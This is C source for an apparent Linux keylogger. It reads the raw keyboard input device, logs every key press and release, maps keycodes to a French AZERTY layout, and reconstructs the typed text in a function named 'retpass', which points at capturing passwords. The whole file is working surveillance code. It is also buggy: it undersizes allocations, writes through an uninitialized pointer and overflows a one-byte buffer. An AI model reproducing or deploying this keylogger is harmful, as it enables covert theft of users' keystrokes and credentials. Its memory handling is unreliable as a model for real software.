#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>
#include <stdio.h>

char	retmaj(char dest)
{
  char	a;
  (dest >= 97 && dest <= 122) ? a = dest - 32 : 0;
  return (a);
}

char	*retmaj_bis(char *dest)
{
  char	*a;

  (strcmp(dest, "&") == 0) ? a = "1" : 0;
  (strcmp(dest, "é") == 0) ? a = "2" : 0;
  //(strcmp(dest, 34) == 0) ? a = "3" : 0;
  (strcmp(dest, "'") == 0) ? a = "4" : 0;
  (strcmp(dest, "(") == 0) ? a = "5" : 0;
  (strcmp(dest, "-") == 0) ? a = "6" : 0;
  (strcmp(dest, "è") == 0) ? a = "7" : 0;
  (strcmp(dest, "_") == 0) ? a = "8" : 0;
  (strcmp(dest, "ç") == 0) ? a = "9" : 0;
  (strcmp(dest, "à") == 0) ? a = "0" : 0;
  (strcmp(dest, ")") == 0) ? a = "°" : 0;
  (strcmp(dest, "=") == 0) ? a = "+" : 0;
  (strcmp(dest, "^") == 0) ? a = "¨" : 0;
  (strcmp(dest, "$") == 0) ? a = "£" : 0;
  (strcmp(dest, "ù") == 0) ? a = "%" : 0;
  (strcmp(dest, "*") == 0) ? a = "µ" : 0;
  (strcmp(dest, "<") == 0) ? a = ">" : 0;
  (strcmp(dest, ",") == 0) ? a = "?" : 0;
  (strcmp(dest, ";") == 0) ? a = "." : 0;
  (strcmp(dest, ":") == 0) ? a = "/" : 0;
  (strcmp(dest, "!") == 0) ? a = "§" : 0;
  return (a);
}

int	strlencharchar(char **dest)
{
  int	i;

  i = 0;
  while (dest[i] != 0)
    i++;
  return (i);
}

char	*convert_to_key(int nb)
{
  char	**dest;
  dest = malloc(sizeof(char) * 128);
  dest[1] = "ECHAP";
  dest[59] = "F1";
  dest[60] = "F2";
  dest[61] = "F3";
  dest[62] = "F4";
  dest[63] = "F5";
  dest[64] = "F6";
  dest[65] = "F7";
  dest[66] = "F8";
  dest[67] = "F9";
  dest[68] = "F10";
  dest[87] = "F11";
  dest[88] = "F12";
  dest[110] = "INSERT";
  dest[99] = "IMPR. ECRAN";
  dest[111] = "SUPPR.";
  dest[41] = "²";
  dest[2] = "&";
  dest[3] = "é";
  dest[4] = 34;
  dest[5] = "'";
  dest[6] = "(";
  dest[7] = "-";
  dest[8] = "è";
  dest[9] = "_";
  dest[10] = "ç";
  dest[11] = "à";
  dest[12] = ")";
  dest[13] = "=";
  dest[14] = "BACKSPACE";
  dest[102] = "ORIGINE";
  dest[15] = "TAB";
  dest[16] = "a";
  dest[17] = "z";
  dest[18] = "e";
  dest[19] = "r";
  dest[20] = "t";
  dest[21] = "y";
  dest[22] = "u";
  dest[23] = "i";
  dest[24] = "o";
  dest[25] = "p";
  dest[26] = "^";
  dest[27] = "$";
  dest[28] = "ENTREE";
  dest[104] = "PREVPG";
  dest[58] = "MAJ";
  dest[30] = "q";
  dest[31] = "s";
  dest[32] = "d";
  dest[33] = "f";
  dest[34] = "g";
  dest[35] = "h";
  dest[36] = "j";
  dest[37] = "k";
  dest[38] = "l";
  dest[39] = "m";
  dest[40] = "ù";
  dest[43] = "*";
  dest[109] = "NXTPG";
  dest[42] = "LSHIFT";
  dest[86] = "<";
  dest[44] = "w";
  dest[45] = "x";
  dest[46] = "c";
  dest[47] = "v";
  dest[48] = "b";
  dest[49] = "n";
  dest[50] = ",";
  dest[51] = ";";
  dest[52] = ":";
  dest[53] = "!";
  dest[54] = "RSHIFT";
  dest[107] = "END";
  dest[29] = "LCTRL";
  dest[125] = "DEM";
  dest[56] = "ALT";
  dest[57] = "SPACE";
  dest[100] = "ALTGR";
  dest[127] = "CR.DR";
  dest[97] = "RCTRL";
  dest[105] = "LEFT";
  dest[103] = "UP";
  dest[108] = "DOWN";
  dest[106] = "RIGHT";

  return (dest[nb]);
}

char	**convert_to_real(char **dest)
{
  int	i;
  int	j;
  char	**str;

  str = malloc(sizeof(char *) * strlencharchar(dest));
  i = 0;
  (strcmp(dest[0], "ENTREE") == 0) ? i++ : 0;
  while (dest[i] != 0)
    {
      if (strcmp(dest[i], "RSHIFT") != 0 && strcmp(dest[i], "LSHIFT") != 0 && strcmp(dest[i], " ") != 0)
	{
	  j = i + 1;
	  while (strcmp(dest[i], dest[j]) != 0)
	    j++;
	  dest[j] = " ";
	  i++;
	  j = i + 1;
	}
      else
	i++;
    }
  dest[i] = 0;
  i = 1;
  while (dest[i + 1] != 0)
    {
      if (strcmp(dest[i], " ") == 0 && strcmp(dest[i + 1], " ") == 0)
	{
	  while (dest[i + 2] != 0)
	    {
	      dest[i + 1] = dest[i + 2];
	      i++;
	    }
	  dest[i + 1] = 0;
	  i = 1;
	}
      else
	i++;
    }
  i = 1;
  *str = "ENTREE";
  while (dest[i] != 0)
    {
      if (strcmp(dest[i],"RSHIFT") == 0 || strcmp(dest[i], "LSHIFT") == 0)
	{
	  str[i] = strdup(dest[i]);
	  j = i + 1;
	  while (strcmp(dest[j], dest[i]) != 0)
	    {
	      if (strlen(dest[j]) <= 2 && strcmp(dest[j], " ") != 0)
		{
		  str[j] = malloc(sizeof(char));
		  if (*dest[j] >= 97 && *dest[j] <= 122)
		    {
		      *str[j] = retmaj(*dest[j]);
		      str[j][1] = '\0';
		    }
		  else
		    str[j] = retmaj_bis(dest[j]);
		}
	      else
		str[j] = strdup(dest[j]);
	      j++;
	    }
	  str[j] = strdup(dest[j]);
	  i = j + 1;
	}
      else
	{
	  str[i] = strdup(dest[i]);
	  i++;
	}
    }
  str[i] = 0;
  return (str);
}

void	retpass(char **dest)
{
  int	i;
  int	j;
  char	*d;

  i = j = 0;
  while (dest[i] != 0)
    {
      if (strcmp(dest[i], " ") == 0 || strcmp(dest[i], "RSHIFT") == 0)
	i++;
      else if (strcmp(dest[i], "ENTREE") == 0)
	d[j++] = '\n', i++;
      else if (strcmp(dest[i], "SPACE") == 0)
	d[j++] = ' ', i++;
      else
	{
	  d = strcat(d, dest[i]);
	  j += strlen(dest[i]);
	  i++;
	}
    }
  d[j] = 0;
  write(1, d, strlen(d));
}

int	main()
{
  FILE *file;
  const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  struct input_event ev;
  ssize_t n;
  int fd;
  int	i;
  char buffer[400];
  char	**dest;

  dest = malloc(sizeof(char *) * 1000);
  i = 0;
  file = fopen("./log.txt", "w");
  fd = open(dev, O_RDONLY);
  if (fd == -1)
    {
      fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
      return EXIT_FAILURE;
    }
  fread(buffer, 100, 1, file);
  while (1)
    {
      n = read(fd, &ev, sizeof ev);
      if (n == (ssize_t)-1)
	{
	  if (errno == EINTR)
	    continue;
	  else
	    break;
	}
      else if (n != sizeof ev)
	{
	  errno = EIO;
	  break;
	}
      if (ev.type == EV_KEY && ev.value == 1)
	{
	  if (strcmp(convert_to_key(ev.code), "ECHAP") == 0)
	    break;
	  fread(buffer, 100, 1, file);
	  dest[i++] = convert_to_key(ev.code);
	  dest[i++] = " ";
	  //dest = strcat(dest, convert_to_key(ev.code));
	  //dest[my_strlen(dest)] = '\n';
	  //printf("%s\n", convert_to_key(ev.code));
	}
      if (ev.type == EV_KEY && ev.value == 0)
	{
	  fread(buffer, 100, 1, file);
	  dest[i++] = convert_to_key(ev.code);
	  dest[i++] = " ";
	  //dest = strcat(dest, convert_to_key(ev.code));
	  //dest[my_strlen(dest)] = '\n';
	  //printf("%s\n\n", convert_to_key(ev.code));
	}
    }
  //dest[my_strlen(dest) + 1] = 0;
  dest[i] = 0;
  dest = convert_to_real(dest);
  retpass(dest);
  //i = 0;
  //  while (dest[i] != 0)
  // printf("%s", dest[i++]);
  //printf("%s\n", dest);
  fflush(stdout);
  //fprintf(stderr, "%s.\n", strerror(errno));
  fclose(file);
  return EXIT_FAILURE;
}
